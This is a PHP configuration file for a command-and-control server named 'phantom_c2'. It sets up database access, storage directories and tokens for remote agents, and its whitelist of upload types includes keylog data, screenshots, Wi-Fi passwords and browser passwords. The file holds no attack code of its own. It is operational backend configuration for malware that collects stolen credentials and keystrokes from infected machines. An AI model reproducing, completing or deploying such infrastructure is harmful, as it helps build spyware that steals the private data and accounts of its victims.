<?php
declare(strict_types=1);

// Fail-closed configuration
$requiredSecrets = ['PHANTOM_SECRET_KEY', 'PHANTOM_DB_PASS'];
foreach ($requiredSecrets as $secret) {
    $value = getenv($secret);
    if ($value === false || $value === '' || $value === 'CHANGE_ME') {
        http_response_code(500);
        die("Configuration error: $secret is required");
    }
}

return [
    'db' => [
        'driver'   => 'mysql',
        'host'     => getenv('PHANTOM_DB_HOST') ?: 'localhost',
        'database' => getenv('PHANTOM_DB_NAME') ?: 'phantom_c2',
        'username' => getenv('PHANTOM_DB_USER') ?: 'phantom_user',
        'password' => getenv('PHANTOM_DB_PASS'),
        'charset'  => 'utf8mb4',
    ],
    'secret_key'       => getenv('PHANTOM_SECRET_KEY'),
    'data_dir'         => getenv('PHANTOM_DATA_DIR') ?: __DIR__ . '/data/',
    'log_dir'          => getenv('PHANTOM_LOG_DIR') ?: __DIR__ . '/logs/',
    'upload_dir'       => getenv('PHANTOM_UPLOAD_DIR') ?: __DIR__ . '/uploads/',
    'tls_enabled'      => true,
    'agent_token_ttl'  => 86400,
    'max_upload_size'  => 10 * 1024 * 1024,
    'chunk_size'       => 10240,
    // Allowed upload types – new types added
    'allowed_upload_types' => [
        'system',
        'output',
        'keylog_data',
        'screenshot',
        'wifi_passwords',
        'browser_passwords',
        'hardware_info'
    ],
    'token_hash_algo'  => 'sha256',
];